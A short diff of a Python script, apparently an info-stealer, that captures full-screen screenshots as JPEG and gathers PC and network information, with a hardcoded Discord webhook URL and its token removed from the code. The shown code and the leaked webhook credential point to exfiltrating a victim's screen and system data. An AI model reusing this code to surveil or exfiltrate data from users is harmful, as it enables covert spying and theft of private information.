@@ -244,12 +244,12 @@ def empaquetar_network():
 
 def capturar_pantalla_jpg():
   try:
-    # Tomar captura de pantalla completa
+    
     screenshot = pyautogui.screenshot()
 
-    # Convertir y guardar en memoria como JPEG
+    
     img_byte_arr = io.BytesIO()
-    # Convertir a RGB por si la imagen tiene canal alfa (PNG transparente) que JPEG no soporta directamente
+    
     rgb_im = screenshot.convert("RGB")
     rgb_im.save(img_byte_arr, format="JPEG", quality=85)
     img_byte_arr.seek(0)
@@ -260,7 +260,7 @@ def capturar_pantalla_jpg():
 
 ######## Webhook #############################################################
 
-WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560081432678895616/zHK9qlIKhkH4FyZmxwrybudV8QEqVrhz-IY0avSoUKk3pyaV9J8PSZTgiW8PyjxXyMHa"
+WEBHOOK_URL_UNICO = ""
 
 
 def obtener_info_pc():
